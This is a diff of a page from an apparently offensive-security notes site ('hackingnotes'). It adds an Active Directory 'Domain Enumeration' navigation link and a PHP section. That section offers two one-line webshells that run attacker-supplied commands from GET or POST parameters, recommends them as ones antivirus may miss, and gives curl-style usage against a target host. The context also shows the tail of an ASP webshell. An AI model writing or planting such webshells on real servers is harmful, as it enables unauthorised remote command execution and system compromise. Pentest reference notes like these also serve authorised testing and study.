@@ -56,8 +56,10 @@
 					
 						<li class="nav-item top-level ">
 							
-							<a href="/hackingnotes/active-directory/ad-attacks/">Active Directory</a>
+							<a href="/hackingnotes/active-directory/domain-enumeration/">Active Directory</a>
 							<ul>
+								
+									<li class="nav-item "><a href="/hackingnotes/active-directory/domain-enumeration/">Domain Enumeration</a></li>
 								
 									<li class="nav-item "><a href="/hackingnotes/active-directory/ad-attacks/">AD Attacks</a></li>
 								
@@ -351,6 +353,25 @@ strOutput = objShellExec.StdOut.ReadAll()
 WScript.StdOut.Write(strOutput)
 WScript.Echo(strOutput)
 %&gt;
+</code></pre></div></div>
+<h1 id="php">PHP</h1>
+
+<p>The are some typicall PHP webshells, but some are detected by AV. Here are some usefull ones.</p>
+
+<ul>
+  <li>https://github.com/bayufedra/Tiny-PHP-Webshell</li>
+</ul>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?=</span><span class="sb">`$_GET[0]`</span><span class="cp">?&gt;</span>
+
+Usage :
+  http://target.com/path/to/shell.php?0=command
+</code></pre></div></div>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?=</span><span class="sb">`$_POST[0]`</span><span class="cp">?&gt;</span>
+
+Usage :
+  curl -X POST http://target.com/path/to/shell.php -d "0=command"
 </code></pre></div></div>
 
 			</article>
